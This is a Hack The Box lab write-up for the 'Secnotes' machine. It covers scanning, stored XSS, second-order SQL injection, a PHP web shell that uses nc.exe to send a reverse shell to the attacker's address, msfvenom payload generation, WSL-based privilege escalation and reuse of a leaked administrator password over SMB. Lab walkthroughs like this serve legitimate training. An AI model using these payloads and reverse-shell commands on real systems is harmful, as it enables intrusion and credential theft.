# Hackthebox - Secnotes

## Nmap

```
┌──(root💀kali)-[~/Documents/hackthebox/secnotes]
└─# nmap -T4 -A -p- 10.10.10.97
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-02 10:46 EDT
Nmap scan report for 10.10.10.97
Host is up (0.025s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
| http-title: Secure Notes - Login
|_Requested resource was login.php
|_http-server-header: Microsoft-IIS/10.0
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0
|_http-title: IIS Windows
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP|7 (89%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows XP SP3 (89%), Microsoft Windows XP SP2 (86%), Microsoft Windows 7 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-04-02T14:50:46
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2022-04-02T07:50:47-07:00
|_clock-skew: mean: 2h22m41s, deviation: 4h02m32s, median: 2m39s

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   24.69 ms 10.10.14.1
2   24.84 ms 10.10.10.97

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 150.12 seconds
```

## Port 80

- There is a website in which we can register
![image](https://user-images.githubusercontent.com/96747355/161392042-5ba00a95-a1a6-4fb3-b094-f50db3e8fd95.png)
- There is also a message disclosing an email address
![image](https://user-images.githubusercontent.com/96747355/161392138-71a2dd00-b6b2-40ad-9c7c-8f8253f0cfbd.png)
- So we keep it aside ` tyler@secnotes.htb` we can also edit our `/etc/hosts` file and add `10.10.10.97 secnotes.htb` in it  
- No sqli in the login
- Let's try on the register if we register a user with username `<script>alert(1)</script>` when we login with it after we have a stored xss:
![image](https://user-images.githubusercontent.com/96747355/161392971-b25a15fc-5a56-4c1e-9647-40051f478fee.png)
- So we need to investigate the username parameter and see if it might be vulnerable to sqli
- Let's try with this `' or 1=1; --` we get an internal server error when trying to login with this after but if we register with `'OR 1 OR'` it actually works and we get all the tickets
![image](https://user-images.githubusercontent.com/96747355/161393496-bd38b265-53ad-4c97-8cd9-34bcfc9298d6.png)  
- We even get a user and password: `tyler / 92g!mA8BGjOirkL%OG*&` along with what looks like an smb folder so definetely worth trying to connect there `\\secnotes.htb\new-site`

## SMB

```
┌──(root💀kali)-[~/Documents/hackthebox/secnotes]
└─# smbclient \\\\10.10.10.97\\new-site -U tyler
smb: \> download test.txt
download: command not found
smb: \> put test.txt
putting file test.txt as \test.txt (0.0 kb/s) (average 0.0 kb/s)
smb: \> ls
  .                                   D        0  Sat Apr  2 17:04:06 2022
  ..                                  D        0  Sat Apr  2 17:04:06 2022
  iisstart.htm                        A      696  Thu Jun 21 11:26:03 2018
  iisstart.png                        A    98757  Thu Jun 21 11:26:03 2018
  test.txt                            A        0  Sat Apr  2 17:04:06 2022

                7736063 blocks of size 4096. 3395585 blocks available
```
- We get to a share that hosts the default files of the webserver on port 8808. We have write rights (you can see above that I was able to download a test file) so we could use and aspx reverse shell `msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=5555 -f aspx > shell.aspx`
- We put it on the share `put shell.aspx`
- We launch on listener `rlwrap nc -lvp 5555`
- We browse to our reverse shell from the website - does not work :$ - our file are deleted
- Let's try to put `/usr/share/windows-resources/binaries/nc.exe` in it
- We can then make a php file that will launch nc and connect it to our machine so that we get a reverse shell:
```
<?php
system('nc.exe -e cmd.exe 10.10.14.4 5555')
?>
```
- We can then browse to the page, and we get a shell
![image](https://user-images.githubusercontent.com/96747355/161402147-fa79ebc5-e6c1-48ca-9392-86c0870c3266.png)
- We can then grab the user flag

## Privilege Escalation

- In the desktop of tyler there is a bash.lnk. We could use [this from payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---windows-subsystem-for-linux-wsl) to privesc
- Let's see if we have a bash.exe file somewhere
```
where /R c:\windows bash.exe
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
```
- Now let's find wsl.exe
```
where /R c:\windows wsl.exe
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1_none_686f10b5380a84cf\wsl.exe
```
- Let's see if we are root with wsl:
```
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1_none_686f10b5380a84cf\wsl.exe whoami
root
```
- We are root
- Let's launch the bash to get the shell
![image](https://user-images.githubusercontent.com/96747355/161403022-8d3f3c2f-afc2-4b4f-b52b-a68f97217af5.png)
Let's spawn a [tty shell](https://netsec.ws/?p=337)
```
python -c "import pty;pty.spawn('/bin/bash')"
```
- if we type history we have an instresting output
```
history
    1  cd /mnt/c/
    2  ls
    3  cd Users/
    4  cd /
    5  cd ~
    6  ls
    7  pwd
    8  mkdir filesystem
    9  mount //127.0.0.1/c$ filesystem/
   10  sudo apt install cifs-utils
   11  mount //127.0.0.1/c$ filesystem/
   12  mount //127.0.0.1/c$ filesystem/ -o user=administrator
   13  cat /proc/filesystems
   14  sudo modprobe cifs
   15  smbclient
   16  apt install smbclient
   17  smbclient
   18  smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
   19  > .bash_history 
   20  less .bash_history
   21  uname -a
   22  pwd
   23  ls -al
   24  history
```

- We have the password for the admin por smbclient
- ` smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\10.10.10.97\\c$` And it works! We can actually connect as administrator to an smb share we just need to grab the flag
![image](https://user-images.githubusercontent.com/96747355/161403183-d7124822-5828-47fe-bfb3-7dc58440c1f6.png)
